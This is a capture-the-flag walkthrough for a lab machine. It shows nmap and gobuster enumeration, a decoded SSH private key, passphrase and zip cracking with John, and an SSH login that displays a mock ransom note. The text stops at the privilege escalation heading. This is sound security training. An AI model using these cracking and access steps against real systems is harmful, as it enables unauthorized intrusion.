# Add `contain-linux.thm` to `/etc/hosts`
Add the target hostname to your attacker machine's `/etc/hosts` file (root required).

`echo "<IPv4 address of target hostname> contain-linux.thm" >> /etc/hosts` (Attacker Machine)
# Active Scanning / Network Discovery
First and foremost, run a full port scan with Nmap to find open ports, services, and versions.

`nmap -A -p- -sC -sV contain-linux.thm` (Attacker Machine)
<pre>
Nmap scan report for contain-linux.thm
Host is up (0.00037s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 02:91:E8:F5:68:F7 (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=11/3%OT=22%CT=1%CU=37563%PV=Y%DS=1%DC=D%G=Y%M=0291E8%T
OS:M=6908888E%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=105%TI=Z%CI=Z%II=I
OS:%TS=A)OPS(O1=M2301ST11NW7%O2=M2301ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11N
OS:W7%O5=M2301ST11NW7%O6=M2301ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F
OS:4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T
OS:=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R
OS:%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=
OS:40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0
OS:%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R
OS:=Y%DFI=N%T=40%CD=S)

Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.37 ms contain-linux.thm

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.19 seconds
</pre>
The scan returns an open SSH service on default TCP port 22 and an open HTTP service on default port 80.
# Web Enumeration (Port 80)
Enumerate directories and files on the web server using gobuster.

`gobuster dir -u http://contain-linux.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,htm,txt` (Attacker Machine)
<pre>
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://contain-linux.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,htm,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 282]
/.htm                 (Status: 403) [Size: 282]
/index.html           (Status: 200) [Size: 10671]
/&lt;redacted&gt;           (Status: 200) [Size: 4372]
/server-status        (Status: 403) [Size: 282]
Progress: 1091375 / 1091380 (100.00%)
===============================================================
Finished
===============================================================
</pre>
This enumeration discovers an interesting file on the webroot.
# Decoding File Content
The retrieved file contains encoded data written in the Brainfuck esoteric language. Decode that content using an online decoder.

[Brainfuck Language](https://www.dcode.fr/brainfuck-language) (Attacker Machine)

The decoded string provides a private OpenSSH key. Save the decoded private OpenSSH key in the file `contain-linux.key` and restrict it to read permission for the owner.
# Private OpenSSH Key
Since this private OpenSSH key does not reveal any corresponding user for initial access, further research will be necessary. Nonetheless, use it first by printing its accordant public OpenSSH key.

`ssh-keygen -y -f contain-linux.key` (Attacker Machine)
<pre>
Enter passphrase: 
</pre>
The usage of the private OpenSSH key prompts for a passphrase. Convert the private OpenSSH key to a John-compatible hash and catch a glimpse of it.

`ssh2john contain-linux.key | cut -d':' -f2- > contain-linux.hash` (Attacker Machine)

`cat contain-linux.hash` (Attacker Machine)
<pre>
$sshng$6$16$ce1f3b2d872c026f3f2707c4d2f936f8$290$6f70656e7373682d6b65792d7631000000000a6165733235362d637472000000066263727970740000001800000010ce1f3b2d872c026f3f2707c4d2f936f80000001800000001000000330000000b7373682d656432353531390000002061930510e0d95bbd1db82114af7157a07e5f43ee051f5c55b41603059fc9cb90000000a0932b4b4d7576b0c7443f30d0e0e9bc6a77946da35292f4b1e0dcb9b8616b91af5dfbda383f0b5487416b664f0f8e1009c65c8d5527c27b6dea27bab8e7bfc9c0340cf4d15bad2c0f59fac4ae8fb7f05bb97aaeb8c7a566dd66b4eaee9c8793feadeb7b4fafcd1c801d142434615155b3f8978b1e5ec36743df0fee10cc4a9c24408ed95d2f7a65559429468af73fcc8ca69f35bec253c46eae302dd5ded0b801$24$130
</pre>
Run a wordlist attack with John and `rockyou.txt`.

`john --wordlist=/usr/share/wordlists/rockyou.txt contain-linux.hash` (Attacker Machine)
<pre>
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 24 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
</pre>
Retrieving John's status by pressing any key apart from `q` or `Ctrl-C` reveals a too long time to finish. A second glimpse of `contain-linux.key` reveals a useful hint in the last line.

`cat contain-linux.key` (Attacker Machine)
<pre>
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDOHzsthy
wCbz8nB8TS+Tb4AAAAGAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIGGTBRDg2Vu9Hbgh
FK9xV6B+X0PuBR9cVbQWAwWfycuQAAAAoJMrS011drDHRD8w0ODpvGp3lG2jUpL0seDcub
hha5GvXfvaOD8LVIdBa2ZPD44QCcZcjVUnwntt6ie6uOe/ycA0DPTRW60sD1n6xK6Pt/Bb
uXquuMelZt1mtOrunIeT/q3re0+vzRyAHRQkNGFRVbP4l4seXsNnQ98P7hDMSpwkQI7ZXS
96ZVWUKUaK9z/MjKafNb7CU8RurjAt1d7QuAE=
-----END OPENSSH PRIVATE KEY-----
^[0-9]{2}[a-z]{7}$
</pre>
It seems to be a regular expression applicable to `rockyou.txt`.

`grep -E "^[0-9]{2}[a-z]{7}$" /usr/share/wordlists/rockyou.txt > /tmp/rockyou.txt`

Launch another wordlist attack with John and the shaped `rockyou.txt`.

`john --wordlist=/tmp/rockyou.txt contain-linux.hash` (Attacker Machine)
<pre>
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 24 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
&lt;redacted&gt;        (?)     
1g 0:00:21:39 DONE 0.000769g/s 8.185p/s 8.185c/s 8.185C/s 11defense..11clifton
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
</pre>
The second attack outputs the correct passphrase after a while. Use the private OpenSSH key again by printing its accordant public OpenSSH key.

`ssh-keygen -y -f contain-linux.key` (Attacker Machine)
<pre>
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGGTBRDg2Vu9HbghFK9xV6B+X0PuBR9cVbQWAwWfycuQ &lt;redacted&gt;@contain-linux
</pre>

The comment of the public OpenSSH key reveals the username for initial access. Access `contain-linux.thm` with SSH, the private OpenSSH key and its passphrase.

`ssh -i contain-linux.key <redacted>@contain-linux.thm` (Attacker Machine)
<pre>
The authenticity of host 'contain-linux.thm' can't be established.
ECDSA key fingerprint is SHA256:TacqfIcOT2jMwLPHRQFjL8Hgjcn4tGlPz/5F8DRz6Zc.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'contain-linux.thm' (ECDSA) to the list of known hosts.
Enter passphrase for key 'contain-linux.key': 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-161-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Sun Nov  2 19:25:49 2025 from 10.0.2.2
......
***** Your Files Have Been Encrypted *****

Oops! Some files in your home directory have been encrypted using strong cryptography.

What happened?
- Your important files are now inaccessible.
- Attempting to modify or recover your files without the proper decryption key will result in permanent data loss.

How to recover your files?
- Send payment of 1 BTC to the following address: bc1qhv6m5ssfldakjvdn4r9vtfqskjscfleefpn2v3
- E-mail your proof of payment and your unique ID: contain.linux@gmail.com
- After verification, you will receive the decryption instructions.

What you must NOT do?
- Turn off your computer.
- Try to recover or modify encrypted files.
- Seek help from third parties before contacting us.

Deadline:
- If we do not receive payment within two hours, your decryption key will be destroyed and your files will be lost forever.
</pre>
# `user.txt`
Since you do not want to pay any money, ignore the ransom demand. Find and the expected file `user.txt` inside the home directory.

`cat user.txt` (Target Machine)

It reads illegible content rather than the expected user flag. Thus, analyze it thoroughly.

`file user.txt` (Target Machine)
<pre>
user.txt: Zip archive data, at least v2.0 to extract, compression method=deflate
</pre>
Since it turns out to be a zip file, try to unzip it.

`unzip user.txt` (Target Machine)
<pre>
-bash: unzip: command not found
</pre>
Since the target machine lacks the `unzip` command, copy `user.txt`to the attacker machine.

`scp -i contain-linux.key <redacted>@contain-linux.thm:~/user.txt .` (Attacker Machine)
<pre>
Enter passphrase for key 'contain-linux.key': 
user.txt
</pre>
Try to unzip it on the attacker machine.

`unzip user.txt` (Attacker Machine)
<pre>
Archive:  user.txt
[user.txt] test.txt password: 
</pre>
A password protects the zip file. Hence, convert it to a John-compatible hash.

`zip2john user.txt > user.hash` (Attacker Machine)
<pre>
ver 2.0 efh 5455 efh 7875 user.txt/test.txt PKZIP Encr: 2b chk, TS_chk, cmplen=55, decmplen=44, crc=4805F81A type=8
</pre>
Run a wordlist attack with John and `rockyou.txt`.

`john --wordlist=/usr/share/wordlists/rockyou.txt user.hash` (Attacker Machine)
<pre>
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
&lt;redacted&gt;       (user.txt/test.txt)
1g 0:00:00:02 DONE (2025-11-03 21:10) 0.3787g/s 5039Kp/s 5039Kc/s 5039KC/s 12eelhsa..129791
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
</pre>
John outputs the password very quickly. Use it to unzip `user.txt`.

`unzip user.txt` (Attacker Machine)
<pre>
Archive:  user.txt
[user.txt] test.txt password: 
  inflating: test.txt
</pre>
Unzipping `user.txt` extracts `test.txt`. Catch a glimpse of `test.txt` to retrieve the user flag.

`cat test.txt`
<pre>
THM{&lt;redacted&gt;}
</pre>
# Privilege Escalation to root
